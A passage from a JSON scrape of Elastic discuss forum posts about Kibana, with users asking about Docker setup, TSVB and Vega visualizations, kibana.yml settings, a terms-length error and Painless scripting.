    "category": [
      "Kibana"
    ],
    "author": "lohit18",
    "date": "April 6, 2020, 6:37am April 6, 2020, 10:46am April 18, 2020, 3:30pm",
    "body": "Guys, anyone has idea how to show each minute data in line charts using timestamp. i am unable to drag data points",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "140e4335-39af-420f-803a-b561333c46ac",
    "url": "https://discuss.elastic.co/t/ml-doesnt-track-array-type-data-using-by-field-name-individually/227967",
    "title": "ML doesn't track \"array\" type data using by_field_name individually",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 14, 2020, 4:59pm April 14, 2020, 5:50pm April 14, 2020, 6:04pm April 14, 2020, 7:07pm April 14, 2020, 7:19pm April 14, 2020, 8:23pm April 14, 2020, 9:07pm April 17, 2020, 5:15pm April 17, 2020, 5:54pm April 17, 2020, 6:26pm April 17, 2020, 7:25pm April 17, 2020, 11:09pm April 18, 2020, 1:34pm",
    "body": "",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "c18c7158-1215-4f9f-bf72-d2477c88acef",
    "url": "https://discuss.elastic.co/t/docker-install-question/228620",
    "title": "Docker install question",
    "category": [
      "Kibana"
    ],
    "author": "werowe",
    "date": "April 18, 2020, 6:40am April 18, 2020, 9:11am",
    "body": "There's something not logical about the procedure for using KIbana and ElasticSearch docker images. You first start Elasticsearch. That then takes up port 5601, which is where Kibana listens. But there is no http service there. So you try to start Kibana using the container ID of the running Elasticsearch docker process, But then it says port 5601 is already in use. So how do you start KIbana? And how do you bind it to a routable IP address. The instructions say you can pass an environment variable SERVER_HOME to do that. But it just ignores that. sudo docker pull docker.elastic.co/elasticsearch/elasticsearch:7.6.2 sudo nohup docker run -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" docker.elastic.co/elasticsearch/elasticsearch:7.6.2& sudo docker pull docker.elastic.co/kibana/kibana:7.6.2 sudo docker run --link ed618e4091f2 -p 5601:5601 docker.elastic.co/kibana/kibana:7.6.2 -e SERVER_HOST='paris2x'",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "1a4201a6-b73a-42cc-befb-493446ca82f3",
    "url": "https://discuss.elastic.co/t/tsvb-with-two-visualizations-no-data-during-time-period-on-one-suppresses-display-of-other/228355",
    "title": "TSVB with two visualizations: no data during time period on one suppresses display of other",
    "category": [
      "Kibana"
    ],
    "author": "tomj",
    "date": "April 16, 2020, 3:38pm April 17, 2020, 7:01pm",
    "body": "Using Elastic Cloud with 7.6.2, Kibana 7.6.2. I've got time series data as follows. One component generates a variety of messages. I have a panel filter that selects the component, then two visualizations that subdivide the data for presentation. What I have found is that for a given time period, if one of the two visualizations has no documents found, the display of the other visualization will not appear. Below are examples, and the visualization JSON associated with this visualization. 6.7 example of TSVB over 4 hours (running on AWS ES, works) 6.7 example of TSVB over 30 minutes (running on AWS ES, works) 7.6 example of TSVB over one hour (Elastic Cloud, works) 7.6 example of TSVB over 15 minutes (Elastic Cloud, illustrates problem) Screenshot from 2020-04-15 16-35-501784×860 91 KB Screenshot from 2020-04-15 16-36-131784×864 82.9 KB Screenshot from 2020-04-15 15-38-411785×902 96.4 KB Screenshot from 2020-04-15 15-33-581785×904 55 KB { \"title\": \"CDN Adapter Host Counts, Restarts by Version (TSVB)\", \"type\": \"metrics\", \"params\": { \"id\": \"61ca57f0-469d-11e7-af02-69e470af7417\", \"type\": \"timeseries\", \"series\": [ { \"id\": \"61ca57f1-469d-11e7-af02-69e470af7417\", \"color\": \"#68BC00\", \"split_mode\": \"terms\", \"metrics\": [ { \"id\": \"61ca57f2-469d-11e7-af02-69e470af7417\", \"type\": \"cardinality\", \"field\": \"fields.host.keyword\" } ], \"separate_axis\": 0, \"axis_position\": \"right\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": 1, \"point_size\": 1, \"fill\": \"0\", \"stacked\": \"none\", \"label\": \"Host count\", \"terms_field\": \"fields.version.keyword\", \"split_color_mode\": \"gradient\", \"value_template\": \"Hosts {{value}}\" }, { \"id\": \"85079d80-5ff0-11ea-8dab-1bd437b3194e\", \"color\": \"rgba(188,0,19,1)\", \"split_mode\": \"terms\", \"metrics\": [ { \"id\": \"85079d81-5ff0-11ea-8dab-1bd437b3194e\", \"type\": \"count\" } ], \"separate_axis\": 1, \"axis_position\": \"right\", \"formatter\": \"number\", \"chart_type\": \"line\", \"line_width\": 1, \"point_size\": 1, \"fill\": \"0\", \"stacked\": \"none\", \"label\": \"Restart Counts by Version\", \"terms_field\": \"fields.version.keyword\", \"filter\": \"message:start\", \"value_template\": \"Restarts {{value}}\" } ], \"time_field\": \"timestamp\", \"index_pattern\": \"\", \"interval\": \"auto\", \"axis_position\": \"left\", \"axis_formatter\": \"number\", \"axis_scale\": \"normal\", \"show_legend\": 1, \"show_grid\": 1, \"default_index_pattern\": \"logs-*\", \"filter\": \"fields.name:cdnadapter\" }, \"aggs\": [] }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "56c21a53-87fe-4f09-9a50-84c11d32d263",
    "url": "https://discuss.elastic.co/t/problem-date-histogram-in-vega-with-aggregation/228487",
    "title": "Problem date_histogram in vega with aggregation",
    "category": [
      "Kibana"
    ],
    "author": "nb03briceno",
    "date": "April 17, 2020, 10:02am April 17, 2020, 10:33am April 17, 2020, 10:42am April 17, 2020, 12:15pm April 17, 2020, 1:48pm April 17, 2020, 3:54pm April 17, 2020, 5:30pm",
    "body": "Hello everyone, I'm trying to create a graph with vega. A date histogram graph from an aggregation, but it is not working. In Kibana, it shows me the following error. _.aggregations is undefined Would you mind to make a look, and giving to me a suggestion. The associated code is this: { $schema: https://vega.github.io/schema/vega-lite/v2.json title: Daily Count data: { url: { index: hs_index body: { size: 1000000, // Just ask for the fields we actually need for visualization _source: [\"@timestamp\",\"@version\",\"consumed\",\"consumed_text1\",\"consumed_text2\",\"free\",\"free_text1\",\"free_text2\",\"host\", \"logLevel\", \"logdate\",\"max\",\"max_text1\",\"max_text2\",\"message\",\"values\",\"values_names\",\"date_time\",\"date_time\",\"message\"] \"track_total_hits\": true, \"query\": { \"match\": { \"message\": \"COMMAND ORDER\" } }, \"aggregations\":{ order_over_time:{ date_histogram: { field: \"date_time\", format: \"yyyy-MM-dd hh:mm-ss\", interval: \"day\" } } } } } format: {property: \"aggregations.order_over_time.buckets\"} } mark: bar encoding: { x: { field: key type: temporal axis: {title: false} } y: { field: doc_count type: quantitative axis: {title: \"Call count\"} } } } Thanks so much, JUAN DAVID BRICENO GUERRERO",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "4c88a182-ac7b-49d8-8f4b-0a17fecad771",
    "url": "https://discuss.elastic.co/t/kibana-yml-is-not-accepting-custom-headers/228416",
    "title": "Kibana.yml is not accepting custom headers",
    "category": [
      "Kibana"
    ],
    "author": "somebody",
    "date": "April 16, 2020, 10:41pm April 17, 2020, 3:09pm",
    "body": "My kibana.yml looks like below: Kibana.yml elasticsearch.customHeaders: { \"my_consumer.id\":\"5cf4af56-1769-4fb7-84ef-71cc99eb23\" } elasticsearch.hosts: http://<es_ip>:9200 logging.dest: /var/log/kibana/kibana.log pid.file: /var/run/kibana.pid server.host: \"0.0.0.0\" server.port: 5601 In the custom headers, If we provide key my_consumer.id with \".\" in it Kibana will not start up. If we remove the \".\" from key my_consumerid, kibana is starting up and connecting to ES. I have a bunch of key value pair with \".\" in it to provide as custom headers. I have tried escaping it my_consumer\\.id but no luck. Could someone please help me on this? Thanks, Somebody",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ce8fa5c6-0f9e-481c-b7bc-e86f97401593",
    "url": "https://discuss.elastic.co/t/dynamic-kibana-visualization-embedding/228179",
    "title": "Dynamic kibana visualization embedding",
    "category": [
      "Kibana"
    ],
    "author": "Amine_Maalfi",
    "date": "April 15, 2020, 5:35pm April 17, 2020, 3:46pm April 16, 2020, 8:30pm April 17, 2020, 2:45pm",
    "body": "Hello is there a way to dynamically display embedded visualizations of kibana in our applications? for example changing the index name dynamically",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "83da7020-fe1c-4fbf-b42e-885abde70707",
    "url": "https://discuss.elastic.co/t/solved-adding-custom-csp-rule-on-elastic-cloud-csp-rules-is-not-allowed-not-possible-yet/228513",
    "title": "[ SOLVED] Adding custom csp rule on Elastic Cloud : 'csp.rules': is not allowed - Not possible yet",
    "category": [
      "Kibana"
    ],
    "author": "IanCap",
    "date": "April 17, 2020, 2:22pm April 17, 2020, 2:20pm April 17, 2020, 2:23pm April 17, 2020, 2:22pm April 17, 2020, 2:23pm",
    "body": "Hi ! I'm currently trying to modify the Content Security Policy in the kibana.yml file on a Clouded Deployment to allow a custom javascript to run on a dashboard but i get the following error message when adding the csp rules csp.rules': is not allowed My configuration is the following : csp.rules: # current defaults - \"script-src 'unsafe-eval' 'self' 'nonce-{base64nonce}'\" I researched the following links first whitout success : Is there any method to set content security policy only in Kibana plugin code? Kibana Currently, I am developing a kibana plugin that uses iframe to load remote website. Here is the content of plugins/query_ai/public/components/main/main.js: import React from 'react'; export class Main extends React.Component { constructor(props) { super(props); this.state = {}; } componentDidMount() { /* FOR EXAMPLE PURPOSES ONLY. There are much better ways to manage state and update your UI than this. */ const { httpClient } = this.props; this.se… Problem with google map api integration in React Kibana Plugin Kibana I am developing a custom plugin with React for Kibana. I need to use google geocode and reverse geocode from google map API. But I am facing a problem when I inject the API script in my react component. It seems like it refuses to connect the Google Map API network. So the API throws a network error. Refused to load the script 'https://maps.googleapis.com/maps/api/js?key={MY_API_KEY}&libraries=places%2Cgeometry' because it violates the following Content Security Policy directive: \"script-src … The problem of using iframe when developing a Kibana plugin that loads remote website Kibana I am developing a Kibana plugin and named it test-3. This is the content of kibana/plugins/test_3/public/components/main/main.js: import React from 'react'; export class Main extends React.Component { constructor(props) { super(props); this.state = {}; } componentDidMount() { /* FOR EXAMPLE PURPOSES ONLY. There are much better ways to manage state and update your UI than this. */ const { httpClient } = this.props; httpClient.get('../api/test3/examp… Any help would be much appreciated ! Thanks in advance, Ian",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "dd2f0dce-1d07-4949-ab2a-3e4a9a29c5a5",
    "url": "https://discuss.elastic.co/t/this-builder-doesnt-allow-terms-that-are-larger-than-1-000-characters/228529",
    "title": "This builder doesn't allow terms that are larger than 1,000 characters",
    "category": [
      "Kibana"
    ],
    "author": "lmourer",
    "date": "April 17, 2020, 1:54pm April 17, 2020, 1:58pm",
    "body": "Hello, Kibana 7.6.2 Elasticsearch 7.6.2 Ubuntu 18.04 When i want to filter a keyword in discover in kibana, i have this error : Capture d’écran 2020-04-17 à 15.50.362560×1224 359 KB { \"took\": 10, \"timed_out\": false, \"_shards\": { \"total\": 14, \"successful\": 12, \"skipped\": 0, \"failed\": 2, \"failures\": [ { \"shard\": 0, \"index\": \"crawlpr-2020.04.17\", \"node\": \"DkbjPH_JS-mW78Bv_er3iA\", \"reason\": { \"type\": \"illegal_argument_exception\", \"reason\": \"This builder doesn't allow terms that are larger than 1,000 characters, got java.lang.RuntimeException: Unable to parse raw availability [Tijdelijk niet beschikbaar (web)]\\n\\tat com.workit.crawl.medimarket.data.fields.offers.main.fields.availability.AvailabilityParser.parseItemAvailability(AvailabilityParser.java:50)\\n\\tat com.workit.crawl.medimarket.data.fields.offers.main.fields.availability.AvailabilityParser.apply(AvailabilityParser.java:38)\\n\\tat com.workit.crawl.medimarket.data.fields.offers.main.fields.availability.AvailabilityParser.apply(AvailabilityParser.java:15)\\n\\tat com.workit.crawl.parsing.api.java8.logging.ParsingLogger.apply(ParsingLogger.java:40)\\n\\tat com.workit.crawl.parsing.api.java8.logging.Logging.applyAndLog(Logging.java:51)\\n\\tat com.workit.crawl.parsing.api.java8.model.offer.OfferParserTemplate.apply(OfferParserTemplate.java:90)\\n\\tat com.workit.crawl.medimarket.data.fields.offers.main.MainOfferParser.apply(MainOfferParser.java:40)\\n\\tat com.workit.crawl.medimarket.data.fields.offers.OffersParser.apply(OffersParser.java:24)\\n\\tat com.workit.crawl.medimarket.data.fields.offers.OffersParser.apply(OffersParser.java:13)\\n\\tat com.workit.crawl.parsing.api.java8.logging.ParsingLogger.apply(ParsingLogger.java:40)\\n\\tat com.workit.crawl.parsing.api.java8.logging.Logging.applyAndLog(Logging.java:51)\\n\\tat com.workit.crawl.parsing.api.java8.model.offer.OfferSpecificationParsingTemplate.apply(OfferSpecificationParsingTemplate.java:112)\\n\\tat com.workit.crawl.medimarket.data.OfferSpecificationsParser.extractOfferSpecification(OfferSpecificationsParser.java:56)\\n\\tat com.workit.crawl.medimarket.data.OfferSpecificationsParser.handleOfferSpecification(OfferSpecificationsParser.java:37)\\n\\tat com.workit.crawl.medimarket.data.OfferSpecificationsParser.apply(OfferSpecificationsParser.java:30)\\n\\tat com.workit.crawl.medimarket.page.OfferPageParser.parse(OfferPageParser.java:29)\\n\\tat com.workit.crawl.medimarket.page.OfferPageParser.parse(OfferPageParser.java:12)\\n\\tat com.workit.crawl.medimarket.page.PageParser.applyFirstMatchedParser(PageParser.java:13)\\n\\tat com.workit.crawl.medimarket.plugins.CrawlOfferAction.parseResponseAndStoreResult(CrawlOfferAction.java:70)\\n\\tat com.workit.crawl.medimarket.plugins.CrawlOfferAction.doAction(CrawlOfferAction.java:50)\\n\\tat com.workit.crawl.processor.service.ActionExecutor.executeAction(ActionExecutor.java:76)\\n\\tat com.workit.crawl.processor.ProcessorManager.doAction(ProcessorManager.java:253)\\n\\tat com.workit.crawl.processor.ProcessorManager.executeAction(ProcessorManager.java:206)\\n\\tat com.workit.crawl.processor.ProcessorManager.processActionForFoundOperationAndTarget(ProcessorManager.java:168)\\n\\tat com.workit.crawl.processor.ProcessorManager.processForFoundSite(ProcessorManager.java:180)\\n\\tat com.workit.crawl.processor.ProcessorManager.processForFoundOperation(ProcessorManager.java:149)\\n\\tat com.workit.crawl.processor.ProcessorManager.processForFoundJob(ProcessorManager.java:128)\\n\\tat com.workit.crawl.processor.ProcessorManager.processForFoundExecution(ProcessorManager.java:114)\\n\\tat com.workit.crawl.processor.ProcessorManager.process(ProcessorManager.java:97)\\n\\tat com.workit.crawl.processor.queue.dynamic.channel.ActionMessageProcessorUsingChannel.onDelivery(ActionMessageProcessorUsingChannel.java:444)\\n\\tat com.workit.crawl.processor.queue.dynamic.channel.ActionMessageProcessorUsingChannel.handleMessage(ActionMessageProcessorUsingChannel.java:436)\\n\\tat com.workit.crawl.processor.queue.dynamic.channel.ActionMessageProcessorUsingChannel.handleDelivery(ActionMessageProcessorUsingChannel.java:315)\\n\\tat com.rabbitmq.client.impl.ConsumerDispatcher$5.run(ConsumerDispatcher.java:144)\\n\\tat com.rabbitmq.client.impl.ConsumerWorkService$WorkPoolRunnable.run(ConsumerWorkService.java:99)\\n\\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\\n\\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\\n\\tat java.lang.Thread.run(Thread.java:748)\\n\" } } ] }, \"hits\": { \"total\": 169, \"max_score\": null, \"hits\": [] }, \"aggregations\": { \"2\": { \"buckets\": [ { \"key_as_string\": \"2020-04-17T15:03:30.000+02:00\", \"key\": 1587128610000, \"doc_count\": 8 }, { \"key_as_string\": \"2020-04-17T15:04:00.000+02:00\", \"key\": 1587128640000, \"doc_count\": 13 }, { \"key_as_string\": \"2020-04-17T15:04:30.000+02:00\", \"key\": 1587128670000, \"doc_count\": 7 }, { \"key_as_string\": \"2020-04-17T15:05:00.000+02:00\", \"key\": 1587128700000, \"doc_count\": 7 }, { \"key_as_string\": \"2020-04-17T15:07:00.000+02:00\", \"key\": 1587128820000, \"doc_count\": 5 }, { \"key_as_string\": \"2020-04-17T15:08:30.000+02:00\", \"key\": 1587128910000, \"doc_count\": 7 }, { \"key_as_string\": \"2020-04-17T15:09:00.000+02:00\", \"key\": 1587128940000, \"doc_count\": 10 }, { \"key_as_string\": \"2020-04-17T15:09:30.000+02:00\", \"key\": 1587128970000, \"doc_count\": 12 }, { \"key_as_string\": \"2020-04-17T15:10:00.000+02:00\", \"key\": 1587129000000, \"doc_count\": 9 }, { \"key_as_string\": \"2020-04-17T15:10:30.000+02:00\", \"key\": 1587129030000, \"doc_count\": 5 }, { \"key_as_string\": \"2020-04-17T15:11:30.000+02:00\", \"key\": 1587129090000, \"doc_count\": 4 }, { \"key_as_string\": \"2020-04-17T15:12:00.000+02:00\", \"key\": 1587129120000, \"doc_count\": 6 }, { \"key_as_string\": \"2020-04-17T15:12:30.000+02:00\", \"key\": 1587129150000, \"doc_count\": 9 }, { \"key_as_string\": \"2020-04-17T15:13:00.000+02:00\", \"key\": 1587129180000, \"doc_count\": 4 }, { \"key_as_string\": \"2020-04-17T15:13:30.000+02:00\", \"key\": 1587129210000, \"doc_count\": 7 }, { \"key_as_string\": \"2020-04-17T15:14:30.000+02:00\", \"key\": 1587129270000, \"doc_count\": 8 }, { \"key_as_string\": \"2020-04-17T15:15:00.000+02:00\", \"key\": 1587129300000, \"doc_count\": 11 }, { \"key_as_string\": \"2020-04-17T15:15:30.000+02:00\", \"key\": 1587129330000, \"doc_count\": 5 }, { \"key_as_string\": \"2020-04-17T15:16:00.000+02:00\", \"key\": 1587129360000, \"doc_count\": 9 }, { \"key_as_string\": \"2020-04-17T15:16:30.000+02:00\", \"key\": 1587129390000, \"doc_count\": 9 }, { \"key_as_string\": \"2020-04-17T15:17:00.000+02:00\", \"key\": 1587129420000, \"doc_count\": 14 } ] } } } But, if i try the same query in dev tool, it works : Capture d’écran 2020-04-17 à 15.51.162560×1224 547 KB GET crawlpr-*/_search { \"query\": { \"match_phrase\": { \"stackTrace\": { \"query\": \"java.lang.RuntimeException: Unable to parse raw availability [Tijdelijk niet beschikbaar (web)]\\n\\tat com.workit.crawl.medimarket.data.fields.offers.main.fields.availability.AvailabilityParser.parseItemAvailability(AvailabilityParser.java:50)\\n\\tat com.workit.crawl.medimarket.data.fields.offers.main.fields.availability.AvailabilityParser.apply(AvailabilityParser.java:38)\\n\\tat com.workit.crawl.medimarket.data.fields.offers.main.fields.availability.AvailabilityParser.apply(AvailabilityParser.java:15)\\n\\tat com.workit.crawl.parsing.api.java8.logging.ParsingLogger.apply(ParsingLogger.java:40)\\n\\tat com.workit.crawl.parsing.api.java8.logging.Logging.applyAndLog(Logging.java:51)\\n\\tat com.workit.crawl.parsing.api.java8.model.offer.OfferParserTemplate.apply(OfferParserTemplate.java:90)\\n\\tat com.workit.crawl.medimarket.data.fields.offers.main.MainOfferParser.apply(MainOfferParser.java:40)\\n\\tat com.workit.crawl.medimarket.data.fields.offers.OffersParser.apply(OffersParser.java:24)\\n\\tat com.workit.crawl.medimarket.data.fields.offers.OffersParser.apply(OffersParser.java:13)\\n\\tat com.workit.crawl.parsing.api.java8.logging.ParsingLogger.apply(ParsingLogger.java:40)\\n\\tat com.workit.crawl.parsing.api.java8.logging.Logging.applyAndLog(Logging.java:51)\\n\\tat com.workit.crawl.parsing.api.java8.model.offer.OfferSpecificationParsingTemplate.apply(OfferSpecificationParsingTemplate.java:112)\\n\\tat com.workit.crawl.medimarket.data.OfferSpecificationsParser.extractOfferSpecification(OfferSpecificationsParser.java:56)\\n\\tat com.workit.crawl.medimarket.data.OfferSpecificationsParser.handleOfferSpecification(OfferSpecificationsParser.java:37)\\n\\tat com.workit.crawl.medimarket.data.OfferSpecificationsParser.apply(OfferSpecificationsParser.java:30)\\n\\tat com.workit.crawl.medimarket.page.OfferPageParser.parse(OfferPageParser.java:29)\\n\\tat com.workit.crawl.medimarket.page.OfferPageParser.parse(OfferPageParser.java:12)\\n\\tat com.workit.crawl.medimarket.page.PageParser.applyFirstMatchedParser(PageParser.java:13)\\n\\tat com.workit.crawl.medimarket.plugins.CrawlOfferAction.parseResponseAndStoreResult(CrawlOfferAction.java:70)\\n\\tat com.workit.crawl.medimarket.plugins.CrawlOfferAction.doAction(CrawlOfferAction.java:50)\\n\\tat com.workit.crawl.processor.service.ActionExecutor.executeAction(ActionExecutor.java:76)\\n\\tat com.workit.crawl.processor.ProcessorManager.doAction(ProcessorManager.java:253)\\n\\tat com.workit.crawl.processor.ProcessorManager.executeAction(ProcessorManager.java:206)\\n\\tat com.workit.crawl.processor.ProcessorManager.processActionForFoundOperationAndTarget(ProcessorManager.java:168)\\n\\tat com.workit.crawl.processor.ProcessorManager.processForFoundSite(ProcessorManager.java:180)\\n\\tat com.workit.crawl.processor.ProcessorManager.processForFoundOperation(ProcessorManager.java:149)\\n\\tat com.workit.crawl.processor.ProcessorManager.processForFoundJob(ProcessorManager.java:128)\\n\\tat com.workit.crawl.processor.ProcessorManager.processForFoundExecution(ProcessorManager.java:114)\\n\\tat com.workit.crawl.processor.ProcessorManager.process(ProcessorManager.java:97)\\n\\tat com.workit.crawl.processor.queue.dynamic.channel.ActionMessageProcessorUsingChannel.onDelivery(ActionMessageProcessorUsingChannel.java:444)\\n\\tat com.workit.crawl.processor.queue.dynamic.channel.ActionMessageProcessorUsingChannel.handleMessage(ActionMessageProcessorUsingChannel.java:436)\\n\\tat com.workit.crawl.processor.queue.dynamic.channel.ActionMessageProcessorUsingChannel.handleDelivery(ActionMessageProcessorUsingChannel.java:315)\\n\\tat com.rabbitmq.client.impl.ConsumerDispatcher$5.run(ConsumerDispatcher.java:144)\\n\\tat com.rabbitmq.client.impl.ConsumerWorkService$WorkPoolRunnable.run(ConsumerWorkService.java:99)\\n\\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\\n\\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\\n\\tat java.lang.Thread.run(Thread.java:748)\\n\" } } } } The same filter keyword in discover view in elastic 5.6.0 / Kibana 5.6.0 works. Capture d’écran 2020-04-17 à 15.50.552560×1224 422 KB Why i have this error ? It's indexation failed or query failed ? Elasticsearch or kibana failed ? Thank you in advance.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "6caf17af-e13a-408f-8037-ca2921075c73",
    "url": "https://discuss.elastic.co/t/visualization-order-x-axis-values-solely-using-data-matching-specific-term/227170",
    "title": "Visualization: Order X-axis values solely using data matching specific term",
    "category": [
      "Kibana"
    ],
    "author": "someuser914125",
    "date": "April 8, 2020, 4:04pm April 17, 2020, 1:15pm April 17, 2020, 1:46pm",
    "body": "I am working on developing a visualization that, given two snapshots and a list of the top N results for each, create a line graph that compares the results for each snapshots . Sample data: PUT top-results { \"mappings\" : { \"properties\" : { \"uri\" : { \"type\" : \"keyword\" }, \"ordinal\" : { \"type\" : \"integer\" }, \"snapshot\" : { \"type\" : \"keyword\" } } } } Data: PUT top-results {\"key\":\"hello\",\"ordinal\":0} PUT top-results/_doc/1 { \"key\":\"result-1\",\"ordinal\":1,\"snapshot\":\"snapshot a\" } PUT top-results/_doc/2 { \"key\":\"result-2\",\"ordinal\":2,\"snapshot\":\"snapshot a\" } PUT top-results/_doc/3 { \"key\":\"result-3\",\"ordinal\":3,\"snapshot\":\"snapshot a\" } PUT top-results/_doc/4 { \"key\":\"result-4\",\"ordinal\":4,\"snapshot\":\"snapshot a\" } PUT top-results/_doc/5 { \"key\":\"result-5\",\"ordinal\":5,\"snapshot\":\"snapshot a\" } PUT top-results/_doc/6 { \"key\":\"result-2\",\"ordinal\":1,\"snapshot\":\"snapshot b\" } PUT top-results/_doc/7 { \"key\":\"result-1\",\"ordinal\":2,\"snapshot\":\"snapshot b\" } PUT top-results/_doc/8 { \"key\":\"result-3\",\"ordinal\":3,\"snapshot\":\"snapshot b\" } PUT top-results/_doc/9 { \"key\":\"result-5\",\"ordinal\":4,\"snapshot\":\"snapshot b\" } PUT top-results/_doc/10 { \"key\":\"result-4\",\"ordinal\":5,\"snapshot\":\"snapshot b\" } I would like for the X-axis to be ordered as such: result-1, result-2, result-3, result-4, result-5. This is derived by the 'key' values sorted by ordinal ascending but ONLY for values matching \"snapshot a\". The Y-axis plots on the ordinal term. (There is only 1 result per bucket per snapshot, so the aggregation on this doesn't matter.) This means I am expecting a perfectly upward-sloping diagonal base line for \"snapshot a\" and a zigzagging line for \"snapshot b\" that still generally follows the upward trend of \"snapshot a\". How can I go about doing this? I can create the perfectly diagonal line just fine by filtering the data to only use documents with the term \"snapshot a\", but then allowing \"snapshot b\" causes the desired sorting along the x-axis to mess up. Can I accomplish this with JSON input as order by custom metric? This would seem the easiest approach -- filter the data used for creating the x-axis by only the terms with \"snapshot a\". If not, what other approaches can I use to accomplish this? Transform into a new index? We are using Kibana 7.4.0 . Thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4cbab3af-66b1-4d10-8582-4b45372d3167",
    "url": "https://discuss.elastic.co/t/preciso-fazer-um-calculo-que-transforme-de-bytes-para-bits-no-flow-bytes/227332",
    "title": "Preciso fazer um calculo que transforme de Bytes para Bits, no flow.bytes",
    "category": [
      "Kibana"
    ],
    "author": "rafaelassis53",
    "date": "April 9, 2020, 1:37pm April 13, 2020, 6:45pm April 17, 2020, 1:16pm",
    "body": "Preciso fazer um calculo que transforme de Bytes para Bits, no flow.bytes dentro do index patterns, se fosse possivel criar um formart para bits e fazer o calculo",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "56185e34-0aa6-401b-a50c-ab2e3f453961",
    "url": "https://discuss.elastic.co/t/multiple-term-join-in-elastic-maps/227550",
    "title": "Multiple Term Join in Elastic Maps",
    "category": [
      "Kibana"
    ],
    "author": "Bustencio",
    "date": "April 10, 2020, 7:02pm April 10, 2020, 7:34pm April 10, 2020, 7:53pm April 10, 2020, 8:28pm April 10, 2020, 8:30pm April 17, 2020, 9:57am April 17, 2020, 1:06pm",
    "body": "I have a question regarding usage of multiple term join within a layer of Elastic Maps. I have an index that stores the documents with geo_point location and some static values and other index with data that updates every 5 minutes. That second index gathers parameters of a network (cpu load, traffic outbound, traffic inbound...) but each parameter is stored as a unique document, I use 2 fields (parameter and value) to differentiate them. My issue comes when using multiple term joins with filter for each parameter within a layer of the map, I'm capable of retrieving each value correctly if I use different aggregations for each parameter (average of value for parameter 1 and maximum value for parameter 2) but I can't use the same aggregation (average, for example) for both or I get the same value even though each layer is filtered and the values are completely different. I can provide any additional information if it helps. Thank you in advance.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "24688565-a81e-4987-aa1b-b3cd02bcd3fb",
    "url": "https://discuss.elastic.co/t/prevent-page-reset-in-kibana-vizualizations/228282",
    "title": "Prevent page reset in Kibana Vizualizations",
    "category": [
      "Kibana"
    ],
    "author": "jl1705",
    "date": "April 16, 2020, 8:46am April 16, 2020, 1:02pm April 17, 2020, 12:53pm",
    "body": "Hello, As of now, the Kibana Visualizations list will default to 20 rows and start on the first page, regardless of whether i switched to another page before I opened a visualization. I understand this is a very niche use case, but is there any way to retain the current page and the chosen number of records per page, instead of having to pick each time I navigate to the Kibana Visualisations page? Thanks.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f8049be2-4d66-45a6-ac90-15836e8ae710",
    "url": "https://discuss.elastic.co/t/how-to-use-painless-loop-to-create-a-multidimensional-array-from-values-stored-in-2-single-arrays/227947",
    "title": "How to use painless loop to create a multidimensional array from values stored in 2 single arrays?",
    "category": [
      "Kibana"
    ],
    "author": "fbracq",
    "date": "April 14, 2020, 3:08pm April 15, 2020, 9:49am April 17, 2020, 12:49pm",
    "body": "I'm having documents like this in kibana: ... \"children_relationship_type\": [ \"Blood\", \"Blood\", \"Adopted\", \"Adopted\" ], \"children_uuid\": [ \"a385a319\", \"f27e7c95\", \"e01ebd42\", \"773622e4\" ], ... I want to create a painless scripted field from these 2 fields, with the following output: \"siblings\": [ {\"id\": \"a385a319\",\"type\": \"Blood\"}, {\"id\": \"27e7c95\",\"type\": \"Blood\"}, {\"id\": \"e01ebd42\",\"type\": \"Adopted\"}, {\"id\": \"773622e4\",\"type\": \"Adopted\"} ], I'm using this painless script: def res=\"\"; def i=0; for(i=0; i < doc['sibling_uuid'].length;i++){ res +='{\"id\": \"'+doc['sibling_uuid'][i] + '\",\"type\": \"' + doc['sibling_relationship_type'][i]+\"},\"; } return res; But this gives the following (wrong) output: \"siblings\": [ {\"id\": \"773622e4\",\"type\": \"Blood\"},{\"id\": \"a385a319\",\"type\": \"Adopted\"},{\"id\": \"e01ebd42\",\"type\": \"\"},{\"id\": \"f27e7c95\",\"type\": \"} ] Can you help me? Thanks. Frank",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3cf269da-48fa-41a0-bb49-9f4547f22afb",
    "url": "https://discuss.elastic.co/t/datatable-kibana/228077",
    "title": "Datatable Kibana",
    "category": [
      "Kibana"
    ],
    "author": "rwr",
    "date": "April 15, 2020, 9:53am April 15, 2020, 10:27am April 17, 2020, 4:52am April 17, 2020, 8:57am April 17, 2020, 10:40am April 17, 2020, 12:27pm",
    "body": "Hi All how to display the table as shown below .. Thanks before",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "ca9c5ee5-81fc-4406-9bfc-5d3a958bd2b0",
    "url": "https://discuss.elastic.co/t/bringing-up-dockerized-kibana-for-distribution-including-all-saved-objects/227690",
    "title": "Bringing up Dockerized Kibana for distribution including all saved objects",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 12, 2020, 5:57pm April 14, 2020, 2:49pm April 15, 2020, 8:54am April 15, 2020, 9:12am April 17, 2020, 2:19pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "65cdd335-2b7b-4916-8ae6-92dffb209b18",
    "url": "https://discuss.elastic.co/t/kibana-7-4-2-export-csv-from-discovery-works-randomly/228380",
    "title": "Kibana 7.4.2 - Export CSV from Discovery, works randomly",
